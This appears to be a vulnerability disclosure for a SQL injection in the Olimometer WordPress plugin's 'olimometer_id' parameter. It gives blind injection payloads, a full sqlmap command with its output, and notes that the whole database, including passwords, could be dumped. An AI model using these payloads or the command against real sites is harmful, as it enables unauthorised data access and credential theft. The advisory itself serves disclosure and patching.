1 - Description

# Vulnerable parameter: olimometer_id=

Parameter: olimometer_id (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
     Payload: olimometer_id=1 AND 6227=6227

     Type: AND/OR time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind
     Payload: olimometer_id=1 AND SLEEP(5)

Using GET SQL Method with the "olimometer_id" parameter, we were able to
get the database name from the EXAMPLE.COM website . By further running
SQL Map using different arguments, we would be able to get the complete
database, including usernames and passwords if there are such.

2. Proof of Concept

Using the website EXAMPLE.COM for example, we can fire up sqlmap and set
the full path to the vulnerable parameter:

root@kali:~# sqlmap -u
http://EXAMPLE.COM/wp-content/plugins/olimometer/thermometer.php?olimometer_
id=1
--dbs --threads=5 --random-agent --no-cast

---
Parameter: olimometer_id (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
     Payload: olimometer_id=1 AND 6227=6227

     Type: AND/OR time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind
     Payload: olimometer_id=1 AND SLEEP(5)

We can see that we have successfully discovered one available database
with the name: "*****_wrdp1"

3. Type of vulnerability:

An SQL Injection vulnerability in Olimometer allows attackers to read
arbitrary data from the database.

4. Exploitation vector:

The url parameter 'olimometer_id=' of the
/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1 is
vulnerable to SQLI.

5. Attack outcome:

An attacker can read arbitrary data from the database. If the webserver
is misconfigured, read & write access the filesystem may be possible.
